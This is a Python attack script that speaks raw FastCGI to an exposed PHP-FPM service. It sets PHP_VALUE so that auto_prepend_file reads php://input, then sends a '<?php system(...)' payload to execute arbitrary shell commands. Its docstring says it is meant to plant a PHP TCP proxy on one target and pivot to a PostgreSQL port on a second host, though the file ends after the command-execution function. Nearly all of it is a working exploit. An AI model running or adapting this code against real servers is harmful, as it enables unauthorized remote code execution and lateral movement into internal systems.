#!/usr/bin/env python3
"""
Upload a PHP TCP proxy to target-1 via FastCGI and start it.
The proxy listens on a port and forwards to target-2:5432.
"""
import socket
import struct
import sys

def make_fcgi_record(type_id, request_id, content):
    version = 1
    content_length = len(content)
    padding_length = (8 - (content_length % 8)) % 8
    header = struct.pack('!BBHHBx', version, type_id, request_id, content_length, padding_length)
    return header + content + b'\x00' * padding_length

def make_begin_request(request_id):
    body = struct.pack('!HBxxxxx', 1, 0)
    return make_fcgi_record(1, request_id, body)

def make_params(request_id, params_list):
    parts = []
    for key, value in params_list:
        kb = key.encode() if isinstance(key, str) else key
        vb = value.encode() if isinstance(value, str) else value
        if len(kb) < 128:
            parts.append(struct.pack('B', len(kb)))
        else:
            parts.append(struct.pack('!I', len(kb) | 0x80000000))
        if len(vb) < 128:
            parts.append(struct.pack('B', len(vb)))
        else:
            parts.append(struct.pack('!I', len(vb) | 0x80000000))
        parts.append(kb)
        parts.append(vb)
    return make_fcgi_record(4, request_id, b''.join(parts))

def make_stdin(request_id, data):
    return make_fcgi_record(5, request_id, data)

def execute(target_ip, target_port, command):
    php_value = '\nauto_prepend_file = php://input'
    stdin_code = f'<?php system("{command}");die();?>'.encode()

    params = [
        ('SCRIPT_FILENAME', '/var/www/html/index.php'),
        ('REQUEST_METHOD', 'POST'),
        ('CONTENT_TYPE', 'application/x-www-form-urlencoded'),
        ('CONTENT_LENGTH', str(len(stdin_code))),
        ('PHP_VALUE', php_value),
        ('SCRIPT_NAME', '/index.php'),
        ('REQUEST_URI', '/index.php'),
        ('DOCUMENT_ROOT', '/var/www/html'),
        ('SERVER_SOFTWARE', 'php'),
        ('REMOTE_ADDR', '127.0.0.1'),
        ('REMOTE_PORT', '9980'),
        ('SERVER_ADDR', '127.0.0.1'),
        ('SERVER_PORT', '80'),
        ('SERVER_NAME', 'localhost'),
        ('SERVER_PROTOCOL', 'HTTP/1.1'),
    ]

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((target_ip, target_port))
    rid = 1
    s.send(make_begin_request(rid))
    s.send(make_params(rid, params))
    s.send(make_fcgi_record(4, rid, b''))
    s.send(make_stdin(rid, stdin_code))
    s.send(make_fcgi_record(5, rid, b''))

    response = b''
    while True:
        try:
            data = s.recv(4096)
            if not data:
                break
            response += data
        except socket.timeout:
            break
    s.close()

    output = b''
    i = 0
    while i + 8 <= len(response):
        v, rt, rq, cl, pl = struct.unpack('!BBHHBx', response[i:i+8])
        if rt == 6:
            output += response[i+8:i+8+cl]
        elif rt == 3:
            break
        i += 8 + cl + pl
    return output.decode('utf-8', errors='replace')

